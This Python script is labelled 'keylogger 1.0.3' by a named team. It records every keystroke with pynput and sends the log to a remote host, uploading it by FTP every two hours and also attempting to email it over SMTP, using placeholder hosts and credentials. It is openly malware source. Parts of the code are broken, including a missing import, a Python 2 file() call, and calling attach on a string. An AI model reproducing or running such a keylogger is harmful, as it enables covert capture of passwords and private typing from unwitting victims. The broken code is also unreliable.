import os
import sys
import time
import smtplib
import ftplib
import threading
from pynput import keyboard

WORDLIST = "keylogs.txt"
SEND_INTERVAL = 2 * 60 * 60  #Sahmeran-Istiklal Team  - keylogger 1.0.3

FTP_SERVER = "ftp.example.com"
FTP_USER = "username"
FTP_PASSWORD = "password"
FTP_DIRECTORY = "/keylogs"

EMAIL_FROM = "your-email@example.com"
EMAIL_TO = "recipient-email@example.com"
EMAIL_SUBJECT = "Keylogger Alert"
EMAIL_BODY = "Keylogs attached."

class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

class KeyloggerThread(threading.Thread):
    def run(self):
        while True:
            try:
                ftp = ftplib.FTP(FTP_SERVER, FTP_USER, FTP_PASSWORD)
                ftp.cwd(FTP_DIRECTORY)

                with open(WORDLIST, "rb") as f:
                    ftp.storbinary("STOR " + WORDLIST, f)

                ftp.quit()

                os.remove(WORDLIST)
            except Exception:
                pass

            time.sleep(SEND_INTERVAL)

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger_thread = KeyloggerThread()

    keylogger_thread.daemon = True
    keylogger_thread.start()

    keylogger.start()

    with open(WORDLIST, "w") as f:
        f.write(keylogger.log)

    server = smtplib.SMTP("smtp.example.com", 587)
    server.starttls()
    server.login("username", "password")

    message = f"Subject: {EMAIL_SUBJECT}\n\n{EMAIL_BODY}"
    message.attach(MIMEText(file(WORDLIST).read()))

    server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
    server.quit()
